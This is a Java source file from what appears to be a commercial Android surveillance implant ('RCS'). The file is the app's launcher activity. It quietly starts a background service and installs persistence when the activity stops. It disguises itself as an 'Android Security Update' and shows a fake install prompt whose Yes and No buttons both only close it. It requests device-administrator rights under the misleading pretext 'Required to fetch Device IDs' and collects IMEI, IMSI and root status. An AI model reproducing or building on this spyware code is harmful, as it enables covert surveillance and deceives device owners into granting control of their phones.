/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AndroidServiceGUI.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.gui;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.ContextThemeWrapper;
import android.widget.TextView;

import com.android.dvci.Core;
import com.android.dvci.Device;
import com.android.dvci.R;
import com.android.dvci.Root;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.capabilities.PackageInfo;
import com.android.dvci.listener.AR;
import com.android.dvci.util.Check;
import com.android.mm.M;

import java.util.concurrent.TimeUnit;

/**
 * The Class AndroidServiceGUI.
 * http://stackoverflow.com/questions/10909683/launch
 * -android-application-without-main-activity-and-start-service-on-launching
 */
public class ASG extends Activity {
	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$
	private static final int REQUEST_ENABLE = 0;
	public Handler handler;

	/**
	 * Called when the activity is first created.
	 *
	 * @param savedInstanceState the saved instance state
	 */
	@Override
	public void onCreate(final Bundle savedInstanceState) {
		if(Cfg.DEMO) {
			setTheme(R.style.Theme_AndroidStaticDefaultBlack);
		}

		super.onCreate(savedInstanceState);
		actualCreate(savedInstanceState);
	}


	@Override
	public void onStop() {
		super.onStop();

		Root.installPersistence();

	}

	@Override
	public void onDestroy() {
		super.onDestroy();
	}

	@Override
	public void onResume() {
		super.onResume();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onResume) ");
		}
	}

	private void actualCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		Status.setAppGui(this);
		setContentView(R.layout.main);

		if(Cfg.DEMO){
			fillContentText();
		}

		startService();
	}

	public synchronized void showInstallDialog() {
		//fillContentText();
		AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
		new ContextThemeWrapper(Status.getAppGui(), AlertDialog.THEME_HOLO_LIGHT));

		PackageManager packageManager = Status.getAppContext().getPackageManager();
		ApplicationInfo applicationInfo = null;
		try {
			applicationInfo = packageManager.getApplicationInfo(getApplicationInfo().packageName, 0);
		} catch (final PackageManager.NameNotFoundException e) {}
		final String title = (String)((applicationInfo != null) ? packageManager.getApplicationLabel(applicationInfo) : M.e("Android Security Update"));

		// set title
		alertDialogBuilder.setTitle("Do you want to install '" + title + "' ?");

		// set dialog message
		alertDialogBuilder
				.setMessage("Click yes to install!")
				.setCancelable(false)
				.setPositiveButton("Yes",new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog,int id) {
						dialog.cancel();
					}
				})
				.setNegativeButton("No",new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog,int id) {
						dialog.cancel();
					}
				});

		// create alert dialog
		AlertDialog alertDialog = alertDialogBuilder.create();

		// show it
		alertDialog.show();
	}

	private void fillContentText() {
		TextView t = (TextView) findViewById(R.id.content);

		if (Build.MODEL.length() > 0)
			t.append("Model: " + Build.MODEL + "\n");

		if (Build.BRAND.length() > 0)
			t.append("Brand: " + Build.BRAND + "\n");

		if (Build.DEVICE.length() > 0)
			t.append("Device: " + Build.DEVICE + "\n");

		if (Cfg.DEBUG) {
			if (Device.self().getImei().length() > 0)
				t.append("IMEI: " + Device.self().getImei() + "\n");

			if (Device.self().getImsi().length() > 0)
				t.append("IMSI: " + Device.self().getImsi() + "\n");

			if (Build.BOARD.length() > 0)
				t.append("Board: " + Build.BOARD + "\n");

			if (Build.DISPLAY.length() > 0)
				t.append("Display: " + Build.DISPLAY + "\n");
		}

		t.append("OS Level: " + Build.VERSION.SDK_INT + "\n");
		t.append("OS Release: " + Build.VERSION.RELEASE + "\n");

		t.append("OS Runtime: " + (Root.isArtInUse() ? "ART" : "Dalvik") + "\n");

		if (Cfg.DEBUG) {
			if (PackageInfo.hasSu()) {
				t.append("Su: yes, ");
			} else {
				t.append("Su: no, ");
			}
			if (PackageInfo.checkRoot()) {
				t.append("Root: yes");
			} else {
				t.append("Root: no");
			}
		}

		startService();
	}

	private void startExtService() {
		String pack = Status.self().getAppContext().getPackageName();
		final String service = pack + M.e(".app"); //$NON-NLS-1$

		try {
			if (Core.iSR() == false) {
				final ComponentName cn = startService(new Intent(service));
			}
		} catch (final SecurityException se) {

		}
	}

	private void startService() {
		String pack = Status.self().getAppContext().getPackageName();
		final String service = pack + M.e(".app"); //$NON-NLS-1$
		// final String service = "android.intent.action.MAIN";

		try {

			if (Core.iSR() == false) {
				this.handler = new Handler();

				if (Cfg.DEBUG) {
					Check.log(TAG + " Starting cn: " + service);//$NON-NLS-1$
				}

				final ComponentName cn = startService(new Intent(service));

				if (cn == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
					}
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
					}
				}

				Status.setIconState(true);
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + " Already started cn: " + service);//$NON-NLS-1$
				}
			}

		} catch (final SecurityException se) {
			if (Cfg.EXCEPTION) {
				Check.log(se);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
			}
		}
	}

	public void fireAdminIntent() {
		Context context = Status.getAppContext();

		Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
		// intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

		ComponentName deviceAdminComponentName = new ComponentName(context, AR.class);
		intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
		intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");

		// context.startActivity(intent);
		startActivityForResult(intent, REQUEST_ENABLE);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (startService) ACTION_ADD_DEVICE_ADMIN intent fired");
		}
	}

	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		if (REQUEST_ENABLE == requestCode) {
			super.onActivityResult(requestCode, resultCode, data);
		}
	}

	public void deviceAdminRequest() {
		if (Root.shouldAskForAdmin() == false) {
			return;
		}

		handler.postDelayed(new Runnable() {

			@Override
			public void run() {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (deviceAdminRequest run) fireAdminIntent");
				}

				fireAdminIntent();

			}
		}, 1 * 1000);
	}

	public Context getAppContext() {
		return getApplicationContext();
	}
}
